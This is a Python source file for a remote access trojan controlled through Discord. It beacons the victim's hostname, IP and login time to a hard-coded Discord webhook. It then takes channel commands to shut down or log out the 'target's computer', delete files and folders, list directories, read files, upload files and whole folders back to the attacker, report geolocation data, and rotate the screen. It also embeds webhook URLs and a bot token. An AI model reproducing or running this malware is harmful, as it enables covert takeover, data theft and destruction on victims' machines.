import discord
import os
from discord_webhook import DiscordWebhook,DiscordEmbed
from datetime import datetime,date
import socket   
import geocoder
import requests
from time import sleep
import rotatescreen
from pynput.keyboard import Listener
# from pydrive.auth import GoogleAuth
# from pydrive.drive import GoogleDrive


# gauth = GoogleAuth()
# drive = GoogleDrive(gauth)
# folder = "1fBOU6CspebpgaUMGdvNbVrwU3SP1JJ2w"
res=requests.get('https://ipinfo.io/')
data=res.json()
FOLDER_PATH = r'C:\\Users'
now = datetime.now()
today = date.today()
hostname = socket.gethostname()   
IPAddr = socket.gethostbyname(hostname) 
location = geocoder.ip(IPAddr)
datetime = now.strftime("%d/%m/%Y %H:%M:%S") 
client = discord.Client()
webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/929296248186474526/dHjfgml0_RcZmjVI2OBNRVuDYOVtwyBAMiZTpgqGYJ2yThymdix8TJqDwG6OFDOq6GH6', rate_limit_retry=True,
                            content=f'`{hostname}` is online! Targets IP-address =`{IPAddr}` Logged in to the targets computer on :- `{datetime}`')
response = webhook.execute()


@client.event
async def on_ready():
  print('We have logged in as {0.user}'.format(client))

@client.event
async def on_message(message):
  if message.author == client.user:
    return

  msg = message.content
  hostname = socket.gethostname() 
  #test function
  if msg.startswith(f'{hostname} .test'):
    print("Test print successful")
  #display commands
  if msg.startswith(f'.start'):
    WEBHOOK_URL = "https://discordapp.com/api/webhooks/929634181942771752/z4jRCVbvQS-UvFWKlVa-xFMgNT_WTz0kSHb15-DQBZBA8KKHqpRL1XCYH29Z4nXudOK0"
    webhook = DiscordWebhook(url=WEBHOOK_URL)
    embed = DiscordEmbed(titLe=".shutdown", description = ".shutdown\n.restart\n.logout\n.delfol + {path of fol}\n.delfil + {path of file}\n.listdir + {path of dir}\n.read + {path of file}\n.downloadfi + {path of file}\n.downloadfo + {path of fol}\n.getinfo\n.rotate", color="03b2f8")
    embed.set_author(name='Commands')
    embed.set_footer(text="*Please use {hostname} (before the command provided in the onile-targets channel to run the command on their system ex:- Sohan's Laptop {command}*")
    webhook.add_embed(embed)
    response = webhook.execute()
  #to shut down targets computer
  if msg.startswith(f'{hostname} .shutdown'):
    os.system("shutdown /s /t 1")
  #to restart targets computer
  if msg.startswith(f'{hostname} .restart'):
    os.system("shutdown /r /t 1")
  #to logout targets computer
  if msg.startswith(f'{hostname} .logout'):
    os.system("shutdown -l")
  #to delete folder
  if msg.startswith(f'{hostname} .delfol'):
    ldd1 = msg.replace(f'{hostname} ','')
    ldd = ldd1.replace('.delfol ','')  # path to directory you wish to remove
    files_in_dir = os.listdir(ldd)     # get list of files in the directory
    for file in files_in_dir:                  # loop to delete each file in folder
      os.remove(f'{ldd}/{file}')     # delete file
  #to delete file
  if msg.startswith(f'{hostname} .delfil'):
    ldd1 = msg.replace(f'{hostname} ','')
    ldd = ldd1.replace('.delfil ','')
    os.remove(ldd)
    await message.channel.send(f'Deleted Succesfully')
  #list dir of the target
  if msg.startswith(f'{hostname} .listdir'):
    ldi1 = msg.replace(f'{hostname} ','')
    ldi = ldi1.replace('.listdir ','')
    dir = os.listdir(ldi)
    await message.channel.send(f'folder/files in the dir ({ldi}) are:- {dir}')
  #reads a file
  if msg.startswith(f'{hostname} .read'):
    ldr1 = msg.replace(f'{hostname} ','')
    ldr = ldr1.replace('.read ','')
    with open(os.path.join(os.path.dirname(__file__), ldr), 'r', decoding = 'UTF-8') as input_file:
      content = str(input_file.read())
      print(content)
      await message.channel.send(f'%.1999s' % content)
  #Download File
  if msg.startswith(f'{hostname} .downloadfi'):
    ldd1 = msg.replace(f'{hostname} ','')
    ldd = ldd1.replace('.downloadfi ','')
    await message.channel.send(f'Here is what i found!', file=discord.File(ldd))
  #Download Folder
  if msg.startswith(f'{hostname} .downloadfo'):
    ldd1 = msg.replace(f'{hostname} ','')
    ldd = ldd1.replace('.downloadfo ','')
    dir = os.listdir(ldd)
    for item in dir:
      # print(item)
      if os.path.isdir(item):
        await message.channel.send(f'Go to the particular directory to download the files:- `{dir}`')
      else:
        await message.channel.send(f'Here is what i found!', file=discord.File(f'{ldd}\\{item}'))
  #get info to get all the possible details 
  if msg.startswith(f'{hostname} .getinfo'):
    await message.channel.send(f'''   HOSTNAME = `{hostname}`
    IPINFO = `{IPAddr}`
    DATE AND TIME = `{datetime}`
    DATA = `{data}`''')
  #rotates the screen of the target
  if msg.startswith(f'{hostname} .rotate'):
    scrup1 = msg.replace(f'{hostname} ','')
    scrup = scrup1.replace('.rotate ','')
    screen = rotatescreen.get_primary_display()
    for i in range(int(scrup)):
      sleep(1)
      screen.rotate_to(i*90 % 360)

client.run("OTI5Mjc3NzU2MzcyNTgyNDUw.Ydk_Wg.DDqhT-0PYHpryzXXYvubdDaTeTM")